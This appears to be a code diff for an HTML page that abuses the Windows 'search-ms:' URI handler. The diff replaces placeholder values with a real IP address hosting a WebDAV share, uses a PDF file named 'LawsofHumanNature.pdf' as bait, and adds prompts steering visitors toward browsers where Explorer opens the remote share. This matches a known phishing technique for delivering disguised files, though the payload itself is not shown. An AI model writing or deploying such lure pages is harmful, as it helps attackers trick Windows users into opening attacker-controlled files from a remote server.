@@ -1,13 +1,13 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Trigger Search-MS for PDF</title>
+  <title>Trigger Search-MS for WebDAV PDF</title>
 </head>
 <body>
   <h1>Open File Search</h1>
-  <p>Click the button to search for the PDF, or <a href="https://yourdomain.com/sample.pdf">view the PDF directly</a>.</p>
+  <p>Click the button to search for the PDF, or <a href="http://38.247.64.82/share/LawsofHumanNature.pdf">view the PDF directly</a>.</p>
   <p id="browser-warning" style="display: none; color: red;">
-    This feature may not work in Firefox. Please use Chrome, Edge, or the direct PDF link.
+    This feature may not work in Firefox or if the WebDAV share is inaccessible. Use Chrome/Edge or the PDF link.
   </p>
   <button onclick="openSearch()">Search for PDF</button>
   <script>
@@ -16,16 +16,19 @@
     }
 
     function openSearch() {
-      const searchUri = "search-ms:query=sample&crumb=location:\\\\yourserver\\public";
+      const searchUri = "search-ms:query=LawsofHumanNature&crumb=location:\\\\38.247.64.82@80\\share";
       if (isFirefox()) {
         document.getElementById("browser-warning").style.display = "block";
-        alert("Firefox may not fully support this feature. Try clicking the button, or use Chrome, Edge, or the direct PDF link.");
+        alert("Firefox may not support this feature. Try clicking the button, or use Chrome, Edge, or the PDF link.");
       }
       try {
         window.location.href = searchUri;
+        setTimeout(() => {
+          alert("If Windows Explorer didn’t open, ensure the WebDAV share (\\\\38.247.64.82@80\\share) is accessible and contains 'LawsofHumanNature.pdf'. Try the direct PDF link.");
+        }, 3000);
       } catch (e) {
-        alert("Error: Could not open search. Ensure the file share is accessible or use the PDF link. (" + e.message + ")");
         document.getElementById("browser-warning").style.display = "block";
+        alert("Error launching search: " + e.message + ". Check the WebDAV share or use the PDF link.");
       }
     }
   </script>
